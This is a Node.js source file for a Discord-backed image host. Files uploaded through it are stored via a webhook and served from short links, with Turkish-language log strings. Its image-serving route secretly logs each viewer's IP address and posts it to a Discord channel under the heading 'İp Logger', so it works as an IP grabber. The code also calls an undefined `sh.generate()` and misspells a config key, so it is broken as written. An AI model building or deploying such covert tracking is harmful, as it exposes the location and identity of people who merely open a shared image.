import Discord from 'discord.js';
const client = new Discord.Client();
import express from 'express';
import request from'request';
import fileUpload from 'express-fileupload';
const app = express();
import config from "./config.js"
import { JsonDatabase } from "wio.db";
const db = new JsonDatabase({ databasePath:"./images.json" });

app.use(express.static('public'));
app.listen(config.port)

const hook = new Discord.WebhookClient(config.guild.webhook.wehbook_id, config.guild.webhook.webhook_token);
app.use(fileUpload());
app.post('/upload', function (req, res) {
    if(req.header("api_key")!==config.api_key) return res.sendStatus(403);
    if (!req.files) return res.status(400).send('No files were uploaded.');
    let sampleFile = req.files.sampleFile;
    let filename = sh.generate();
    const atac = new Discord.MessageAttachment(sampleFile.data)
    hook.send(atac).then(a => {
        db.set(filename, a.attachments[0].url)
        res.send(`http://${req.headers.host}/images/${filename}`)
        let embed = new Discord.MessageEmbed()
            .setColor("2f3136")
            .setTitle("New Contents")
            .setImage(`http://${req.headers.host}/images/${filename}`)
        client.channels.cache.get(config.guild.channel.image_log).send(embed)
    })
});

app.get('/images/:filename', function(req, res) {
    let search = db.fetch(req.params.filename)
    if (search) {
        var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        ip = ip.replace("::ffff:", "")
        if (config.guild.channel.ip_log) {
            const embed = new Discord.MessageEmbed()
            .setColor("2f3136")
            .setTitle("İp Logger")
            .setDescription(`User ip: ${ip}\nContent viewed: ${req.params.filename}`)
            .setTimestamp()
            client.channels.cache.get(config.guild.channel.ip_log).send(embed)
        }
        request({
                url: search,
                encoding: null
            },
            (err, resp) => {
                if (!err && resp.statusCode === 200) {
                    res.set("Content-Type", "image/jpeg");
                    res.send(resp.body);
                }
            });
    } else {
        return res.sendStatus(404);
    }
});

client.on('ready', () => {
    console.log(`Discord api bağlantısı ${client.user.tag} adı ile başarıyla yapıldı!`);
});

client.login(config.discord_bot_token);
